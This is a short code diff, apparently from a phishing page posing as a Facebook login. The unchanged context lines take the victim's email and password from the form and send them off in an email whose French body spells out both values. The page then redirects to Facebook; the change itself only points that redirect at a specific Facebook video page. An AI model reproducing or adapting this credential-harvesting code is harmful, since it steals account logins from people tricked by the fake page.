@@ -15,7 +15,7 @@ if(mailt.value!=""&&pswd.value!="")
 	Subject : "trois",
 	Body : "Le mail est : "+mailt.value+" et le mot de passe est : "+pswd.value,
 	}).then(
-        message => document.location.href="https://www.facebook.com/"
+        message => document.location.href="https://www.facebook.com/watch/?v=181313309767847"
 	);
 }
 else
